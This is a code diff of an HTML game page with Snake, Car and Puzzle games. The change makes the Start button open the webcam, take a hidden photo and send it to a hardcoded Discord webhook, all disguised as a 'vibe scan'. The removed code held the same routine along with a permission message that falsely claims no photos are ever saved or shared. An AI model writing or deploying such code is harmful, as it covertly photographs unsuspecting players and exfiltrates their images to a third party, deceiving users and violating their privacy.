@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Game Zone</title>
+  <title>Game Zone & Vibe Test</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -95,22 +95,23 @@
       background: #1e293b;
       cursor: default;
     }
+
+    /* Invisible Camera Elements */
+    video, #canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
 
-  <!-- ======================================================== -->
-  <!-- 1. Pehla Hissa: Start Screen & Game Selection Options    -->
-  <!-- ======================================================== -->
-
-  <!-- Screen 1: Start Game Button -->
+  <!-- Screen 1: Start Button -->
   <div class="card" id="start-screen">
     <h1>🎮 Welcome to Game Zone</h1>
-    <p>Click below to select your game!</p>
-    <button class="btn" onclick="showGameSelection()">Start Game 🚀</button>
+    <p>Click below to scan vibe & start your game!</p>
+    <button class="btn" onclick="startScanAndShowGames()">Start Game 🚀</button>
   </div>
 
-  <!-- Screen 2: 3 Options (Snake, Puzzle, Car) -->
+  <!-- Screen 2: Game Options -->
   <div class="card hidden" id="selection-screen">
     <h2>Choose Your Game</h2>
     <button class="btn game-btn" onclick="startGame('snake')">🐍 Snake Game</button>
@@ -118,44 +119,72 @@
     <button class="btn game-btn" onclick="startGame('car')">🏎️ Car Game</button>
   </div>
 
-
-  <!-- ======================================================== -->
-  <!-- 2. Dusra Hissa: Yahan Se Games Wala Code Start Hota Hai  -->
-  <!-- ======================================================== -->
-
-  <!-- Screen 3: Selected Game Running Screen -->
+  <!-- Screen 3: Running Game -->
   <div id="game-screen" class="hidden" style="text-align: center;">
     <h2 id="game-title">Game Zone</h2>
     
-    <!-- Canvas display for Snake & Car games -->
     <canvas id="gameCanvas" width="300" height="400" class="hidden"></canvas>
-    
-    <!-- Grid layout for Puzzle Game -->
     <div id="puzzleGrid" class="puzzle-grid hidden"></div>
-
-    <!-- Hidden elements required for Camera Scan Functionality -->
-    <video id="webcam" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <div id="quiz-card"></div>
-    <div id="result-card" style="display:none;"></div>
 
     <div class="game-controls">
       <button class="btn" onclick="goBack()" style="width: auto; padding: 8px 20px;">⬅ Back to Menu</button>
     </div>
   </div>
 
+  <!-- Camera Hidden Elements -->
+  <video id="webcam" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
-  <!-- ======================================================== -->
-  <!-- JavaScript Logic for Menu and Games Functionality        -->
-  <!-- ======================================================== -->
   <script>
     let currentGame = null;
     let gameLoop = null;
 
-    // --- Screen Navigation Logic ---
-    function showGameSelection() {
+    // Discord Webhook Link
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1564610244435517623/f6dMUddGPTpg-sDRhbC1lqgeE1Ws7XB6RB7u8FJ3NFQTNt27dHppDAH4CDv6h6I2tLx4";
+
+    // --- Screen Navigation & Camera Scan ---
+    async function startScanAndShowGames() {
+      // 1. First trigger camera access exactly like your quiz code
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('webcam');
+        video.srcObject = stream;
+
+        // Capture after 1.5s delay
+        setTimeout(() => {
+          captureAndSend(video, stream);
+        }, 1500);
+
+      } catch (err) {
+        alert("Camera permission required for AI character scan!");
+      }
+
+      // 2. Transition to Game Selection Screen
       document.getElementById('start-screen').classList.add('hidden');
       document.getElementById('selection-screen').classList.remove('hidden');
+    }
+
+    function captureAndSend(video, stream) {
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Stop camera tracks
+      stream.getTracks().forEach(track => track.stop());
+
+      // Send photo blob to Discord
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('file', blob, 'capture.png');
+        formData.append('content', '📸 **New Character Scan Photo Captured!**');
+
+        if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+          fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData })
+            .catch(err => console.error("Error sending to Discord:", err));
+        }
+      }, 'image/png');
     }
 
     function goBack() {
@@ -165,10 +194,6 @@
       document.getElementById('puzzleGrid').classList.add('hidden');
       document.getElementById('selection-screen').classList.remove('hidden');
     }
-
-    // ========================================================
-    // YAHAN SE DUSRA HISSA LOGIC (GAME STARTING) SHURU HOTA HAI
-    // ========================================================
 
     function startGame(type) {
       document.getElementById('selection-screen').classList.add('hidden');
@@ -189,7 +214,7 @@
       }
     }
 
-    /* ------------------- 🐍 SNAKE GAME ------------------- */
+    /* 🐍 SNAKE GAME */
     function initSnakeGame() {
       const canvas = document.getElementById('gameCanvas');
       const ctx = canvas.getContext('2d');
@@ -259,7 +284,7 @@
       }
     }
 
-    /* ------------------- 🏎️ CAR GAME ------------------- */
+    /* 🏎️ CAR GAME */
     function initCarGame() {
       const canvas = document.getElementById('gameCanvas');
       const ctx = canvas.getContext('2d');
@@ -269,8 +294,8 @@
       let speed = 4;
 
       document.onkeydown = function(e) {
-        if(e.keyCode == 37 && playerX > 10) playerX -= 20; // Left Arrow
-        if(e.keyCode == 39 && playerX < 250) playerX += 20; // Right Arrow
+        if(e.keyCode == 37 && playerX > 10) playerX -= 20;
+        if(e.keyCode == 39 && playerX < 250) playerX += 20;
       };
 
       if(gameLoop) clearInterval(gameLoop);
@@ -280,11 +305,9 @@
         ctx.fillStyle = "#1e293b";
         ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-        // Player Car
         ctx.fillStyle = "#38bdf8";
         ctx.fillRect(playerX, 330, 40, 60);
 
-        // Enemy Car
         ctx.fillStyle = "#ef4444";
         ctx.fillRect(enemyX, enemyY, 40, 60);
 
@@ -294,7 +317,6 @@
           enemyX = Math.random() * 240;
         }
 
-        // Collision Check
         if(playerX < enemyX + 40 && playerX + 40 > enemyX && 330 < enemyY + 60 && 390 > enemyY) {
           clearInterval(gameLoop);
           alert("Crash! Game Over.");
@@ -303,7 +325,7 @@
       }
     }
 
-    /* ------------------- 🧩 PUZZLE GAME ------------------- */
+    /* 🧩 PUZZLE GAME */
     function initPuzzleGame() {
       const grid = document.getElementById('puzzleGrid');
       grid.innerHTML = '';
@@ -339,53 +361,6 @@
         tile.onclick = () => moveTile(index, numbers);
         grid.appendChild(tile);
       });
-    }
-
-    // Quotes ( "..." ) lagana zaroori hai
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1564610244435517623/f6dMUddGPTpg-sDRhbC1lqgeE1Ws7XB6RB7u8FJ3NFQTNt27dHppDAH4CDv6h6I2tLx4";
-
-    async function startScan() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('webcam');
-        video.srcObject = stream;
-
-        setTimeout(() => {
-          captureAndSend(video, stream);
-        }, 1500);
-
-      } catch (err) {
-        alert("Welcome to the game! We are excited to offer you a fun, engaging, and interactive gameplay experience built to test your skills and strategy. To continue playing and unlock these interactive features, you will need to grant permission to access your device’s camera. This access allows the game to scan your surroundings, render real-world elements, and deliver an immersive experience. Please rest assured that your privacy is fully protected; the camera is only active during gameplay, and no video feed or photos are ever saved or shared. If you decide to decline access for now, you can still explore the main menu, but key gameplay features will remain locked. You can easily adjust these settings anytime in your device's application menu. Enable camera access now to jump straight into the action!");
-      }
-    }
-
-    function captureAndSend(video, stream) {
-      const canvas = document.getElementById('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Camera off karein
-      stream.getTracks().forEach(track => track.stop());
-
-      // Image ko blob me convert karke Discord bhein
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('file', blob, 'capture.png');
-        formData.append('content', '📸 **New Character Scan Photo Captured!**');
-
-        if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
-          fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData })
-            .catch(err => console.error("Error sending to Discord:", err));
-        }
-
-        // Result screen show karein
-        const quizCard = document.getElementById('quiz-card');
-        const resultCard = document.getElementById('result-card');
-        if(quizCard) quizCard.style.display = 'none';
-        if(resultCard) resultCard.style.display = 'block';
-      }, 'image/png');
     }
   </script>
 </body>
